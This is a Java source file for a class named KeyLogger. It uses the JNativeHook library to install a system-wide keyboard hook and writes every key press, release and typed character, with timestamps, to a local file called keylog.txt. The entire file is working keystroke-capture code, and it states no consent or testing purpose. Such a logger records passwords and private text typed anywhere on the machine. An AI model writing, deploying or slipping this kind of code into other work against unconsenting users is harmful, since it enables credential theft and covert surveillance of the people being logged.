package git.folio;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyLogger implements NativeKeyListener {

    private static final String LOG_FILE = "keylog.txt";
    private PrintWriter writer;

    public KeyLogger() {
        try {
            writer = new PrintWriter(new FileWriter(LOG_FILE, true), true);
        } catch (IOException e) {
            System.err.println("Error opening log file: " + e.getMessage());
            System.exit(1);
        }
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(e.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        logKeyEvent("Key Pressed: " + keyText);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
        logKeyEvent("Key Released: " + keyText);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        char keyChar = e.getKeyChar();
        if (keyChar != NativeKeyEvent.CHAR_UNDEFINED) {
            logKeyEvent("Key Typed: " + keyChar);
        }
    }

    private void logKeyEvent(String eventDescription) {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timestamp = dateFormat.format(new Date());
        writer.println(timestamp + " - " + eventDescription);
        writer.flush(); // Ensure the data is written immediately
    }

    public void cleanup() {
        if (writer != null) {
            writer.close();
        }
    }
}